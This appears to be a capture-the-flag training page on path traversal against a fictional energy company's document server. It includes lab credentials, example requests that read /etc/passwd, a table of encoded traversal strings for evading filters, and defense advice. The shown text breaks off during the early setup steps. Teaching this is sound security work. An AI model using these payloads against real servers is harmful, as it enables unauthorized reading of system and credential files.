@@ -1,0 +1,1500 @@
+
+<!doctype html>
+<html lang="en" class="no-js">
+  <head>
+    
+      <meta charset="utf-8">
+      <meta name="viewport" content="width=device-width,initial-scale=1">
+      
+        <meta name="description" content="Web application penetration testing exercises for OpenCyberRange">
+      
+      
+      
+      
+      
+      
+        
+      
+      
+      <link rel="icon" href="../../assets/images/favicon.png">
+      <meta name="generator" content="mkdocs-1.6.1, mkdocs-material-9.7.2">
+    
+    
+      
+        <title>Exercise MEG3.1: File Server Traversal - Web Application Penetration Testing</title>
+      
+    
+    
+      <link rel="stylesheet" href="../../assets/stylesheets/main.484c7ddc.min.css">
+      
+        
+        <link rel="stylesheet" href="../../assets/stylesheets/palette.ab4e12ef.min.css">
+      
+      
+
+
+    
+    
+      
+    
+    
+      
+        
+        
+        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Inter:300,300i,400,400i,700,700i%7CJetBrains+Mono:400,400i,700,700i&display=fallback">
+        <style>:root{--md-text-font:"Inter";--md-code-font:"JetBrains Mono"}</style>
+      
+    
+    
+      <link rel="stylesheet" href="../../stylesheets/extra.css?v=4">
+    
+    <script>__md_scope=new URL("../..",location),__md_hash=e=>[...e].reduce(((e,_)=>(e<<5)-e+_.charCodeAt(0)),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
+    
+      
+
+    
+    
+  </head>
+  
+  
+    
+    
+      
+    
+    
+    
+    
+    <body dir="ltr" data-md-color-scheme="slate" data-md-color-primary="red" data-md-color-accent="pink">
+  
+    
+    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
+    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
+    <label class="md-overlay" for="__drawer"></label>
+    <div data-md-component="skip">
+      
+        
+        <a href="#exercise-meg31-file-server-traversal" class="md-skip">
+          Skip to content
+        </a>
+      
+    </div>
+    <div data-md-component="announce">
+      
+    </div>
+    
+    
+      
+
+  
+
+<header class="md-header md-header--shadow" data-md-component="header">
+  <nav class="md-header__inner md-grid" aria-label="Header">
+    <a href="../.." title="Web Application Penetration Testing" class="md-header__button md-logo" aria-label="Web Application Penetration Testing" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54"/></svg>
+
+    </a>
+    <label class="md-header__button md-icon" for="__drawer">
+      
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3zm0 5h18v2H3zm0 5h18v2H3z"/></svg>
+    </label>
+    <div class="md-header__title" data-md-component="header-title">
+      <div class="md-header__ellipsis">
+        <div class="md-header__topic">
+          <span class="md-ellipsis">
+            Web Application Penetration Testing
+          </span>
+        </div>
+        <div class="md-header__topic" data-md-component="header-topic">
+          <span class="md-ellipsis">
+            
+              Exercise MEG3.1: File Server Traversal
+            
+          </span>
+        </div>
+      </div>
+    </div>
+    
+      
+        <form class="md-header__option" data-md-component="palette">
+  
+    
+    
+    
+    <input class="md-option" data-md-color-media="" data-md-color-scheme="slate" data-md-color-primary="red" data-md-color-accent="pink"  aria-label="Switch to light mode"  type="radio" name="__palette" id="__palette_0">
+    
+      <label class="md-header__button md-icon" title="Switch to light mode" for="__palette_1" hidden>
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 18c-.89 0-1.74-.2-2.5-.55C11.56 16.5 13 14.42 13 12s-1.44-4.5-3.5-5.45C10.26 6.2 11.11 6 12 6a6 6 0 0 1 6 6 6 6 0 0 1-6 6m8-9.31V4h-4.69L12 .69 8.69 4H4v4.69L.69 12 4 15.31V20h4.69L12 23.31 15.31 20H20v-4.69L23.31 12z"/></svg>
+      </label>
+    
+  
+    
+    
+    
+    <input class="md-option" data-md-color-media="" data-md-color-scheme="default" data-md-color-primary="red" data-md-color-accent="pink"  aria-label="Switch to dark mode"  type="radio" name="__palette" id="__palette_1">
+    
+      <label class="md-header__button md-icon" title="Switch to dark mode" for="__palette_0" hidden>
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a4 4 0 0 0-4 4 4 4 0 0 0 4 4 4 4 0 0 0 4-4 4 4 0 0 0-4-4m0 10a6 6 0 0 1-6-6 6 6 0 0 1 6-6 6 6 0 0 1 6 6 6 6 0 0 1-6 6m8-9.31V4h-4.69L12 .69 8.69 4H4v4.69L.69 12 4 15.31V20h4.69L12 23.31 15.31 20H20v-4.69L23.31 12z"/></svg>
+      </label>
+    
+  
+</form>
+      
+    
+    
+      <script>var palette=__md_get("__palette");if(palette&&palette.color){if("(prefers-color-scheme)"===palette.color.media){var media=matchMedia("(prefers-color-scheme: light)"),input=document.querySelector(media.matches?"[data-md-color-media='(prefers-color-scheme: light)']":"[data-md-color-media='(prefers-color-scheme: dark)']");palette.color.media=input.getAttribute("data-md-color-media"),palette.color.scheme=input.getAttribute("data-md-color-scheme"),palette.color.primary=input.getAttribute("data-md-color-primary"),palette.color.accent=input.getAttribute("data-md-color-accent")}for(var[key,value]of Object.entries(palette.color))document.body.setAttribute("data-md-color-"+key,value)}</script>
+    
+    
+    
+      
+      
+        <label class="md-header__button md-icon" for="__search">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+        </label>
+        <div class="md-search" data-md-component="search" role="dialog">
+  <label class="md-search__overlay" for="__search"></label>
+  <div class="md-search__inner" role="search">
+    <form class="md-search__form" name="search">
+      <input type="text" class="md-search__input" name="query" aria-label="Search" placeholder="Search" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" required>
+      <label class="md-search__icon md-icon" for="__search">
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11z"/></svg>
+      </label>
+      <nav class="md-search__options" aria-label="Search">
+        
+        <button type="reset" class="md-search__icon md-icon" title="Clear" aria-label="Clear" tabindex="-1">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12z"/></svg>
+        </button>
+      </nav>
+      
+    </form>
+    <div class="md-search__output">
+      <div class="md-search__scrollwrap" tabindex="0" data-md-scrollfix>
+        <div class="md-search-result" data-md-component="search-result">
+          <div class="md-search-result__meta">
+            Initializing search
+          </div>
+          <ol class="md-search-result__list" role="presentation"></ol>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+      
+    
+    
+  </nav>
+  
+</header>
+    
+    <div class="md-container" data-md-component="container">
+      
+      
+        
+          
+        
+      
+      <main class="md-main" data-md-component="main">
+        <div class="md-main__inner md-grid">
+          
+            
+              
+              <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+
+
+<nav class="md-nav md-nav--primary" aria-label="Navigation" data-md-level="0">
+  <label class="md-nav__title" for="__drawer">
+    <a href="../.." title="Web Application Penetration Testing" class="md-nav__button md-logo" aria-label="Web Application Penetration Testing" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54"/></svg>
+
+    </a>
+    Web Application Penetration Testing
+  </label>
+  
+  <ul class="md-nav__list" data-md-scrollfix>
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../.." class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Home
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+    
+    
+      
+        
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--section md-nav__item--nested">
+      
+        
+        
+          
+        
+        <input class="md-nav__toggle md-toggle md-toggle--indeterminate" type="checkbox" id="__nav_2" >
+        
+          
+          <label class="md-nav__link" for="__nav_2" id="__nav_2_label" tabindex="">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    CH W1 -- Web Reconnaissance
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_2_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_2">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    CH W1 -- Web Reconnaissance
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../CH_WEB01_Web_Reconnaissance/00_Introduction/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Introduction
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../CH_WEB01_Web_Reconnaissance/01_Basic_Directory_Enumeration/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Exercise W1.1 -- Basic Directory Enumeration
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../CH_WEB01_Web_Reconnaissance/02_Technology_Identification/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Exercise W1.2 -- Technology Identification
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../CH_WEB01_Web_Reconnaissance/03_HTTP_Methods_Enumeration/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Exercise W1.3 -- HTTP Methods Enumeration
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../CH_WEB01_Web_Reconnaissance/04_Header_Analysis/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Exercise W1.4 -- Header Analysis
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../CH_WEB01_Web_Reconnaissance/05_Subdomain_Discovery/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Exercise W1.5 -- Subdomain Discovery
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../CH_WEB01_Web_Reconnaissance/06_Comprehensive_Web_Reconnaissance/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Exercise W1.6 -- Comprehensive Web Reconnaissance
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../CH_WEB01_Web_Reconnaissance/07_Chapter_Review/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Chapter Review
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+    
+    
+      
+        
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--section md-nav__item--nested">
+      
+        
+        
+          
+        
+        <input class="md-nav__toggle md-toggle md-toggle--indeterminate" type="checkbox" id="__nav_3" >
+        
+          
+          <label class="md-nav__link" for="__nav_3" id="__nav_3_label" tabindex="">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    CH W2 -- Web Exploitation
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_3_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_3">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    CH W2 -- Web Exploitation
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../CH_WEB02_Web_Exploitation/00_Introduction/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Introduction
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../CH_WEB02_Web_Exploitation/01_Basic_SQL_Injection/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Exercise W2.1 -- Basic SQL Injection
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../CH_WEB02_Web_Exploitation/02_Chapter_Review/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Chapter Review
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+  </ul>
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+            
+              
+              <div class="md-sidebar md-sidebar--secondary" data-md-component="sidebar" data-md-type="toc" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+  
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#before-you-begin" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Before You Begin
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#engagement-status" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Engagement Status
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#scenario" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Scenario
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#your-objectives" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Your Objectives
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#flag-progress" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Flag Progress
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#background-path-traversal-attacks" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Background: Path Traversal Attacks
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Background: Path Traversal Attacks">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#how-path-traversal-works" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        How Path Traversal Works
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#url-encoding-of-traversal-sequences" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        URL Encoding of Traversal Sequences
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#defense-strategies" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Defense Strategies
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#walkthrough" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Walkthrough
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Walkthrough">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#step-1-launch-the-exercise" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Step 1: Launch the Exercise
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#step-2-configure-host-resolution" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Step 2: Configure Host Resolution
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#step-3-explore-the-intranet-portal" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Step 3: Explore the Intranet Portal
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#step-4-authenticate-to-the-intranet" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Step 4: Authenticate to the Intranet
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#step-5-browse-the-document-library" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Step 5: Browse the Document Library
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#step-6-download-a-legitimate-document" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Step 6: Download a Legitimate Document
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#step-7-test-for-path-traversal" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Step 7: Test for Path Traversal
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#step-8-determine-the-directory-structure" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Step 8: Determine the Directory Structure
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#step-9-traverse-to-the-secrets-directory" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Step 9: Traverse to the Secrets Directory
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#step-10-try-url-encoded-traversal" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Step 10: Try URL-Encoded Traversal
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#step-11-extract-additional-sensitive-files" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Step 11: Extract Additional Sensitive Files
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#step-12-document-and-submit" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Step 12: Document and Submit
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#record-your-findings" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Record Your Findings
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#analysis-questions" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Analysis Questions
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#key-takeaways" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Key Takeaways
+      
+    </span>
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+          
+          
+            <div class="md-content" data-md-component="content">
+              
+              <article class="md-content__inner md-typeset">
+                
+                  
+
+
+
+<h1 id="exercise-meg31-file-server-traversal">Exercise MEG3.1: File Server Traversal</h1>
+<h2 id="before-you-begin">Before You Begin</h2>
+<p>Chapters 1 and 2 focused on the perimeter: network reconnaissance and web application exploitation. Now the engagement moves inward. The Meridian Energy Group corporate intranet hosts a document management system where employees download safety manuals, policy documents, and operational procedures. The file download feature was built quickly and never audited. Your job is to find out what happens when you step outside the intended document root.</p>
+<p>Make sure you have:</p>
+<ul class="task-list">
+<li class="task-list-item"><label class="task-list-control"><input type="checkbox" disabled/><span class="task-list-indicator"></span></label> Completed prior Meridian Energy exercises (Chapters 1-2)</li>
+<li class="task-list-item"><label class="task-list-control"><input type="checkbox" disabled/><span class="task-list-indicator"></span></label> VPN connected and verified</li>
+<li class="task-list-item"><label class="task-list-control"><input type="checkbox" disabled/><span class="task-list-indicator"></span></label> Terminal open with curl available</li>
+<li class="task-list-item"><label class="task-list-control"><input type="checkbox" disabled/><span class="task-list-indicator"></span></label> Browser available for manual testing</li>
+<li class="task-list-item"><label class="task-list-control"><input type="checkbox" disabled/><span class="task-list-indicator"></span></label> Notebook ready for recording findings</li>
+</ul>
+<h2 id="engagement-status">Engagement Status</h2>
+<table>
+<thead>
+<tr>
+<th>Phase</th>
+<th>Status</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Network Reconnaissance</td>
+<td>Complete (Chapter 1)</td>
+</tr>
+<tr>
+<td>Web Exploitation</td>
+<td>Complete (Chapter 2)</td>
+</tr>
+<tr>
+<td><strong>Infrastructure Attacks</strong></td>
+<td><strong>Active</strong></td>
+</tr>
+<tr>
+<td>Admin Takeover</td>
+<td>Pending</td>
+</tr>
+</tbody>
+</table>
+<p><strong>What you know so far:</strong> Network mapping revealed the full Meridian Energy infrastructure. Web exploitation on the employee portal and HR system yielded multiple sets of credentials. Lisa Thornton's Systems Administrator account and David Park's Network Administrator account both have access to internal services.</p>
+<h2 id="scenario">Scenario</h2>
+<p>During your assessment of the Meridian Energy internal network, you discover a corporate intranet site that hosts a document library. Employees use the site to download safety procedures, evacuation plans, and operational guidelines. The download feature accepts a file path parameter in the URL and returns the requested document.</p>
+<p>The development team stored the documents in <code>/data/documents/</code> on the file server. A separate directory, <code>/data/secrets/</code>, contains SCADA system credentials and configuration files that are not intended to be accessible through the web interface. The download endpoint does not validate or sanitize the file path parameter, allowing an attacker to traverse outside the document root using <code>../</code> sequences.</p>
+<p>Your objective: exploit the path traversal vulnerability to escape the document directory, read system files to confirm the vulnerability, and then locate and extract the SCADA credentials file.</p>
+<p><strong>Credentials for this exercise:</strong></p>
+<table>
+<thead>
+<tr>
+<th>Username</th>
+<th>Password</th>
+<th>Role</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>l.thornton@meridian-energy.corp</td>
+<td>Lisa2024#</td>
+<td>Systems Administrator</td>
+</tr>
+<tr>
+<td>d.park@meridian-energy.corp</td>
+<td>David2024#</td>
+<td>Network Administrator</td>
+</tr>
+</tbody>
+</table>
+<p><strong>Target systems:</strong></p>
+<table>
+<thead>
+<tr>
+<th>Hostname</th>
+<th>IP Offset</th>
+<th>Service</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>intranet.meridian-energy.corp</td>
+<td>+10</td>
+<td>Corporate intranet portal</td>
+</tr>
+<tr>
+<td>files.meridian-energy.corp</td>
+<td>+11</td>
+<td>Document file server</td>
+</tr>
+<tr>
+<td>db.meridian-energy.corp</td>
+<td>+12</td>
+<td>Corporate database</td>
+</tr>
+</tbody>
+</table>
+<h2 id="your-objectives">Your Objectives</h2>
+<ul>
+<li>Add target hostnames to <code>/etc/hosts</code> for name resolution</li>
+<li>Authenticate to the corporate intranet using valid credentials</li>
+<li>Browse the document library and identify the download URL pattern</li>
+<li>Exploit path traversal to read <code>/etc/passwd</code> from the file server</li>
+<li>Traverse from <code>/data/documents/</code> to <code>/data/secrets/</code> and extract the SCADA credentials file</li>
+<li>Document the full traversal chain and its implications</li>
+</ul>
+<h2 id="flag-progress">Flag Progress</h2>
+<table>
+<thead>
+<tr>
+<th>Part</th>
+<th>Source</th>
+<th>Status</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Flag</td>
+<td>SCADA credentials file via path traversal</td>
+<td><code>OCR{...}</code></td>
+</tr>
+</tbody>
+</table>
+<hr />
+<h2 id="background-path-traversal-attacks">Background: Path Traversal Attacks</h2>
+<p>Path traversal (also called directory traversal or dot-dot-slash attacks) occurs when an application uses user-supplied input to construct file paths without proper validation. The attacker manipulates the path by inserting <code>../</code> sequences to navigate up the directory tree and access files outside the intended directory.</p>
+<h3 id="how-path-traversal-works">How Path Traversal Works</h3>
+<p>Consider a web application that serves documents from <code>/data/documents/</code>. A normal download request looks like:</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a>GET /download?file=safety/fire-evacuation-plan.txt
+</code></pre></div>
+<p>The server constructs the full path by prepending the document root:</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a>/data/documents/ + safety/fire-evacuation-plan.txt = /data/documents/safety/fire-evacuation-plan.txt
+</code></pre></div>
+<p>An attacker modifies the <code>file</code> parameter to include directory traversal sequences:</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a>GET /download?file=../../../etc/passwd
+</code></pre></div>
+<p>The server constructs:</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a>/data/documents/ + ../../../etc/passwd = /etc/passwd
+</code></pre></div>
+<p>Each <code>../</code> moves one directory up. Three <code>../</code> sequences from <code>/data/documents/</code> reach the filesystem root, and <code>/etc/passwd</code> resolves to the system password file.</p>
+<h3 id="url-encoding-of-traversal-sequences">URL Encoding of Traversal Sequences</h3>
+<p>Web Application Firewalls (WAFs) and input filters sometimes block literal <code>../</code> strings. Attackers bypass these filters using URL-encoded equivalents:</p>
+<table>
+<thead>
+<tr>
+<th>Encoding</th>
+<th>Decoded Value</th>
+<th>Use Case</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>%2e%2e%2f</code></td>
+<td><code>../</code></td>
+<td>Standard URL encoding</td>
+</tr>
+<tr>
+<td><code>%2e%2e/</code></td>
+<td><code>../</code></td>
+<td>Partial encoding</td>
+</tr>
+<tr>
+<td><code>..%2f</code></td>
+<td><code>../</code></td>
+<td>Partial encoding</td>
+</tr>
+<tr>
+<td><code>%252e%252e%252f</code></td>
+<td><code>../</code> (double-encoded)</td>
+<td>Bypasses single-decode filters</td>
+</tr>
+<tr>
+<td><code>..%c0%af</code></td>
+<td><code>../</code> (overlong UTF-8)</td>
+<td>Bypasses Unicode-unaware filters</td>
+</tr>
+<tr>
+<td><code>....//</code></td>
+<td>Resolves to <code>../</code></td>
+<td>Bypasses filters that strip single <code>../</code></td>
+</tr>
+</tbody>
+</table>
+<h3 id="defense-strategies">Defense Strategies</h3>
+<p>Proper defenses against path traversal include:</p>
+<ol>
+<li><strong>Allowlisting</strong>: Maintain a list of permitted files and reject any request for a file not on the list</li>
+<li><strong>Canonicalization</strong>: Resolve the full path using <code>os.path.realpath()</code> or equivalent, then verify it starts with the expected document root</li>
+<li><strong>Chroot jails</strong>: Restrict the web application process to a specific directory subtree so traversal beyond the root is impossible at the OS level</li>
+<li><strong>Input rejection</strong>: Strip or reject any input containing <code>.</code>, <code>/</code>, <code>\</code>, or null bytes, though allowlisting is more reliable</li>
+</ol>
+<hr />
+<h2 id="walkthrough">Walkthrough</h2>
+<h3 id="step-1-launch-the-exercise">Step 1: Launch the Exercise</h3>
+<p>Navigate to the platform and launch the <strong>File Server Traversal</strong> exercise (MEG3.1). Note the target IP addresses displayed in the Active Lab View. Three containers will start: the intranet portal, the file server, and the corporate database.</p>
+<h3 id="step-2-configure-host-resolution">Step 2: Configure Host Resolution</h3>
+<p>Add the target hostnames to your <code>/etc/hosts</code> file so you can reference them by name. Replace <code>&lt;subnet&gt;</code> with your lab subnet.</p>
+<div class="admonition kali">
+<p class="admonition-title">Kali - Add target hostnames to /etc/hosts</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-4-1" name="__codelineno-4-1" href="#__codelineno-4-1"></a><span class="nb">echo</span><span class="w"> </span><span class="s2">&quot;&lt;subnet&gt;.10  intranet.meridian-energy.corp&quot;</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>sudo<span class="w"> </span>tee<span class="w"> </span>-a<span class="w"> </span>/etc/hosts
